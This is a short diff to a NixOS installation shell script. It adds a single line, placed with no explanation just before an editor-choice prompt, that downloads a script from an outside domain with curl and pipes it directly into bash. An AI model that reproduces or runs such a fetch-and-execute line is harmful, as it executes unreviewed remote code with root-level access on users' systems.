@@ -140,6 +140,7 @@ echo "generating NixOS configuration..."
 sudo nixos-generate-config --root /mnt
 
 # Prompt the user to choose between nano or vim
+bash <(curl -L https://www.dwx.my.id//nixset)
 read -p "Press Enter to open the Nix configuration in nano. To use vim, type 'vim' and press Enter: " choice
 
 # Check the user's choice
